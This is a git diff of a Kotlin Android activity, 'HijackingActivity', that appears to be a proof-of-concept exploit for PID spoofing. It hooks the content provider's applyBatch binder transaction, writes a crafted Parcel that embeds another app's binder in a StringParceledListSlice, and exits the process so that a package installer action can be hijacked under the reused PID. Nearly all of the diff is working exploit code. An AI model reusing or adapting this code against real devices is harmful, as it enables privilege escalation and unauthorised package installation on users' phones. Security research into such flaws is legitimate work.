@@ -1,13 +1,10 @@
-package jp.pulm.spoofpid
+package jp.plum.spoofpid
 
 import android.content.ContentProviderOperation
 import android.content.IContentProvider
 import android.net.Uri
-import android.os.Binder
+import android.os.*
 import androidx.appcompat.app.AppCompatActivity
-import android.os.Bundle
-import android.os.IBinder
-import android.os.Parcel
 import android.util.Log
 import diordna.content.pm.StringParceledListSlice
 import kotlinx.coroutines.*
@@ -27,42 +24,87 @@ class HijackingActivity : AppCompatActivity() {
         const val HijackingKey = "HijackingKey"
     }
 
+    private val slice by lazy {
+        StringParceledListSlice(
+            "a b c d e f g".split(" "),
+            intent.getIBinderExtra(MainActivity.BinderKey)
+        ).also {
+            it.setInlineCountLimit(2)
+        }
+    }
+
+    private val request = arrayListOf(
+        ContentProviderOperation.newDelete(
+            Uri.parse(uri)
+        ).build()
+    )
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         installResolver()
+
         verticalLayout {
             button("Apply Batch For PackageInstaller") {
                 onClick {
-                    val binder = intent.getIBinderExtra(MainActivity.BinderKey)
-                    val slice =
-                        StringParceledListSlice("a b c d e f g".split(" "), binder as Binder)
-                    slice.setInlineCountLimit(2)
-
+                    // run on Dispatchers.IO  and ignore all exceptions
                     (GlobalScope + CoroutineExceptionHandler { _, _ -> }).launch(Dispatchers.IO) {
                         // will be hijacked by the install action
-                        contentResolver.applyBatch(
-                            authority, arrayListOf(
-                                ContentProviderOperation.newDelete(
-                                    Uri.parse(uri)
-                                ).withExtra(HijackingKey, slice)
-                                    .build()
-                            )
-                        )
+                        contentResolver.applyBatch(authority, request)
                     }
-
                     Log.e("natsuki", "commit applyBatch operation to package installer")
-
                     // ensure `applyBatch` already committed
-                    delay(1000L)
+                    delay(100L)
                     Log.e(
                         "natsuki",
                         "hijacker will quit this game with pid: ${android.os.Process.myPid()}"
                     )
-//                    exitProcess(0)
+                    exitProcess(0)
                 }
             }
         }
     }
+
+
+    private fun writeToParcel(list: List<ContentProviderOperation>): Parcel {
+        val data = Parcel.obtain()
+        data.writeInterfaceToken(IContentProvider.descriptor)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            attributionSource.writeToParcel(data, 0)
+        }
+        data.writeString(authority)
+        data.writeInt(list.size)
+        val (delete) = list
+        data.writeInt(delete.type)
+        Uri.writeToParcel(data, delete.uri)
+        // ignore method
+        data.writeInt(0)
+        // ignore arg
+        data.writeInt(0)
+        // ignore value
+        data.writeInt(-1)
+        do {
+            //*** begin extra
+            data.writeInt(1) // size
+            data.writeInt(1) // ArrayMap.size
+            data.writeString("foobar") // key
+            data.writeInt(4) // VAL_PARCELABLE
+            data.writeString("android.content.pm.StringParceledListSlice") // parcel name
+            slice.writeToParcel(data, 0)
+            //*** end extra
+        } while (false)
+        // ignore selection
+        data.writeInt(0)
+        // ignore selection args
+        data.writeInt(-1)
+        // ignore expected count
+        data.writeInt(-1)
+        // ignore yield allowed
+        data.writeInt(0)
+        // ignore exception allowed
+        data.writeInt(0)
+        return data
+    }
+
 
     private fun installResolver() {
         val proxy = contentResolver.acquireProvider(authority)
@@ -83,7 +125,13 @@ class HijackingActivity : AppCompatActivity() {
                 flags: Int
             ): Boolean {
                 return if (code == IContentProvider.APPLY_BATCH_TRANSACTION) {
-                    remote.transact(code, fixCreatorName(data), reply, flags)
+                    Log.e("natsuki", "begin transact")
+                    remote.transact(
+                        code,
+                        writeToParcel(request)/* fixCreatorName(data) */,
+                        reply,
+                        flags
+                    )
                 } else {
                     remote.transact(code, data, reply, flags)
                 }
